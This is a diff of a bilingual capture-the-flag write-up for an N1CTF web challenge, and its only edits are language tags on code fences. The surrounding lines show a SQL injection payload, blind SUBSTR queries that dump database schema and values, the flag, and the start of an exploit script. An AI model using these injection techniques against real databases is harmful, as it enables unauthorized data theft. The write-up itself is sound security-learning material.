@@ -31,7 +31,7 @@ This will be my solution on the recent concluded N1CTF's easiest web challenge '
 
 By the time I wrote this, the server is already down. But all the page does was to show the code below.
 
-```
+```php
 <?php
 class ip {
     public $ip;
@@ -125,7 +125,7 @@ The attack plan should be clear now, create an object `flag` and set its `ip` at
 
 The `flag` object is not hard to create, here is the file I wrote to generate such object. Spolier alert, the key will be there.
 
-```
+```php
 <?php
 class ip {
     public $ip;
@@ -171,7 +171,7 @@ I got stuck on this for a really time, so much so I didn't even come up with one
 
 The original writeup used this query:
 
-```
+```sql
 '&&(select extractvalue(rand(),concat(0x3a,((select "n1ctf" from n1ip where 1=2 limit 1)))))&&'
 ```
 
@@ -185,19 +185,19 @@ Back to the payload part, I need to do a blind injection to leak the database. A
 
 Now to construct the leaking query using `SUBSTR`. For example, I know `ip` is a column name in the table `n1ip`. So the following query
 
-```
+```sql
 SELECT SUBSTR(COLUMN_NAME, 1, 1) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='n1ip' LIMIT 1;
 ```
 
 will return `'i'`. Then I can do the comparison like `WHERE 1=1` to make it evaluate as true or false.
 
-```
+```sql
  WHERE (SELECT SUBSTR(COLUMN_NAME, 1, 1) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='n1ip' LIMIT 1)='i';
 ```
 
 And this is how the database will be dumped. To dump schema names:
 
-```
+```sql
 SELECT SUBSTR(SCHEMA_NAME, 1, 1) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1;
 ```
 
@@ -205,19 +205,19 @@ To be clear, the `LIMIT` clause can take two arguments, the first is the index a
 
 To dump table names:
 
-```
+```html
 SELECT SUBSTR(TABLE_NAME, 1, 1) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='<Table Schema>' LIMIT 0,1;
 ```
 
 To dump column names:
 
-```
+```html
 SELECT SUBSTR(COLUMN_NAME, 1, 1) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<Table Name>' LIMIT 0,1;
 ```
 
 Finally to dump values from database:
 
-```
+```html
 SELECT SUBSTR(<Column Name>, 1, 1) FROM <Table Name> LIMIT 0,1;
 ```
 
@@ -233,7 +233,7 @@ n1ctf{you_g0t_1t_hack_for_fun}
 
 ### exp.py
 
-```
+```html
 #!/usr/bin/env python3
 
 import requests
@@ -421,7 +421,7 @@ extract_key()
 
 我做出来这道题的时候比赛已经结束了, 而且我在写这篇文章的时候服务器也没了. 但其实影响不大, 因为网页本身就显示源码而已. 以下是源码:
 
-```
+```php
 <?php
 class ip {
     public $ip;
@@ -515,7 +515,7 @@ if(isset($_GET['input'])){
 
 以下是我弄`flag`类的脚本, 剧透一下, key的值也在里面.
 
-```
+```php
 <?php
 class ip {
     public $ip;
@@ -561,7 +561,7 @@ echo "\n";
 
 原SQL语句:
 
-```
+```sql
 '&&(select extractvalue(rand(),concat(0x3a,((select "n1ctf" from n1ip where 1=2 limit 1)))))&&'
 ```
 
@@ -575,19 +575,19 @@ echo "\n";
 
 接下来是用`SUBSTR`来构建剩下的payload, 比如说`ip`这行在`n1ip`这个表里, 所以一下的SQL语句应该返回`'i'`. 因为`'i'`是第一个字母嘛.
 
-```
+```sql
 SELECT SUBSTR(COLUMN_NAME, 1, 1) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='n1ip' LIMIT 1;
 ```
 
 然后就是像`WHERE 1=1`那样来一个一个泄露数据库.
 
-```
+```sql
 WHERE (SELECT SUBSTR(COLUMN_NAME, 1, 1) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='n1ip' LIMIT 1)='i';
 ```
 
 数据库的名字可以这么被搞出来:
 
-```
+```sql
 SELECT SUBSTR(SCHEMA_NAME, 1, 1) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1;
 ```
 
@@ -595,19 +595,19 @@ SELECT SUBSTR(SCHEMA_NAME, 1, 1) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1;
 
 泄露表名:
 
-```
+```html
 SELECT SUBSTR(TABLE_NAME, 1, 1) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='<Table Schema>' LIMIT 0,1;
 ```
 
 泄露行的名字:
 
-```
+```html
 SELECT SUBSTR(COLUMN_NAME, 1, 1) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<Table Name>' LIMIT 0,1;
 ```
 
 最后的最后就是弄到key的值:
 
-```
+```html
 SELECT SUBSTR(<Column Name>, 1, 1) FROM <Table Name> LIMIT 0,1;
 ```
 
@@ -623,7 +623,7 @@ n1ctf{you_g0t_1t_hack_for_fun}
 
 ### exp.py
 
-```
+```html
 #!/usr/bin/env python3
 
 import requests
